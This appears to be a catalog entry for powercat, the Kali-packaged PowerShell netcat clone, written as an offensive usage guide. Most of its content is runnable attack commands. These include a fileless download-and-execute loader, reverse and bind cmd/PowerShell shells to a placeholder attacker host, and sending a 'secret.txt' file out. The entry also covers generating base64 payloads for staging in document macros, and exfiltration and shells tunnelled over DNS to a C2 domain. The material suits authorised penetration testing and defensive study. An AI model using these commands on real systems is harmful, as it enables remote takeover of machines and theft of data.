---
name: "powercat"
categories:
  - windows-resources
version: "0.0~git20240305.4e33fdf-0kali1"
homepage: "https://github.com/besimorhino/powercat"
origin: "kali"
recipe: "kali-debian"
packaged-by: [kali]
build-system: windows
meta-checked: "2026-11-09"
github-repo: "besimorhino/powercat"
github-stars: 2397
github-pushed: "2024-03-05"
github-archived: false
github-issues: 12
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# powercat

> powercat — netcat rewritten as a single PowerShell function: TCP/UDP shells, relays, file transfer and DNS exfil without dropping a binary.

## What it's for

powercat (besimorhino) is a netcat equivalent implemented as one PowerShell v2+ function in a single `powercat.ps1` file. Because it is pure PowerShell it leaves no new binary on disk, loads straight into memory from a URL, and reads/writes across TCP, UDP and DNS (dnscat2) connections — making it the standard shell primitive on Windows hosts where you already have a PowerShell foothold. It mirrors netcat's mental model (listen or connect, optionally execute a program, pipe bytes), then adds the offensive conveniences: relays between protocols without a second process, standalone payload generation (`-g`/`-ge`) so you can emit a command instead of the whole function, file transfer via input/output paths, and a repeater mode for persistent listeners. It is a shell/relay tool only — it does not encode, stage, or persist by itself, and (as its README warns with `-e` being literally nicknamed GAPING_SECURITY_HOLE) every `-e cmd` form hands shell execution to whoever reaches the socket.

## Typical use cases

### Load the function and catch a reverse shell

The classic two ends of a shell: listener on your box, powercat calling back.

```
IEX (New-Object System.Net.Webclient).DownloadString('https://example.com/powercat.ps1')
powercat -c 198.51.100.10 -p 443 -e cmd
```

Outcome: the first line defines the `powercat` function in the current session without touching disk; the second connects back to 198.51.100.10:443 and serves an interactive `cmd` shell over that TCP connection. On the attacker side any listener works (`nc -lnvp 443` or powercat itself with `-l -p 443`). Loading from a downloaded file is the same thing: `. .\powercat.ps1`.

### Serve a bind shell or a PowerShell shell

Wait for a connection instead of calling out, or execute PowerShell instead of cmd.

```
powercat -l -p 8000 -e cmd
powercat -l -p 8000 -ep
```

Outcome: the first listens on TCP/8000 and hands a `cmd` shell to whoever connects; `-ep` (execute PowerShell) instead gives a shell that runs PowerShell commands — useful where cmd.exe is blocked or logged. `-c`/`-p` with `-e cmd` in client form sends the shell to a remote listener.

### Ship a file or catch one

Move files between hosts over the same channel.

```
powercat -c 198.51.100.10 -p 443 -i C:\users\user\secret.txt
powercat -l -p 443 -of received.txt
```

Outcome: the sender streams `secret.txt` to the listener, whose `-of` writes the bytes to `received.txt`; output type is configurable with `-o` (`Host`, `Bytes`, `String`) when you want to see rather than save what arrives.

### Generate a standalone payload

Emit just the payload as a command, without shipping all of powercat.

```
powercat -c 198.51.100.10 -p 443 -e cmd -g > reverse.ps1
powercat -l -p 8000 -e cmd -ge
```

Outcome: `-g` prints a self-contained reverse-cmd payload script connecting to 198.51.100.10:443 (redirect it to a file, stage it, or paste it into a document macro); `-ge` prints the same payload base64-encoded, directly runnable with `powershell -E <string>`.

### Relay and pivot between protocols

Chain connections without a second process or named pipes.

```
powercat -l -p 8000 -r tcp:198.51.100.10:443
```

Outcome: whatever connects to local port 8000 is relayed to 198.51.100.10:443 — a listener-to-client TCP relay. The same `-r` accepts `udp:198.51.100.10:53` and `dns:198.51.100.10:53:c2.example.com` targets, and relays can be chained client-to-client or listener-to-listener.

### Exfiltrate over DNS or UDP when TCP is blocked

Fall back to protocols that egress filters usually allow.

```
powercat -c 198.51.100.10 -p 8000 -u
powercat -dns c2.example.com -e cmd
```

Outcome: the first moves data over UDP to a matching `-l -p 8000 -u` listener; the second tunnels a shell to a dnscat2 server at c2.example.com over DNS TXT queries (run the dnscat2 server side with `-e open --no-cache`, or point at a specific DNS server with `-c <dns-server> -p 53 -dns c2.example.com`).

### Keep a listener serving after each disconnect

```
powercat -l -p 443 -rep -i C:\users\user\loot.zip
```

Outcome: `-rep` (repeater) restarts the listener after each client disconnects, so the file is served repeatedly — the documented way to run a persistent powercat service.

*Corpus evidence: download of powercat.ps1 and a `powercat -c <ip> -p <port> -e cmd` reverse shell staged as a logon script in the corpus index; every example verified against the upstream README.*
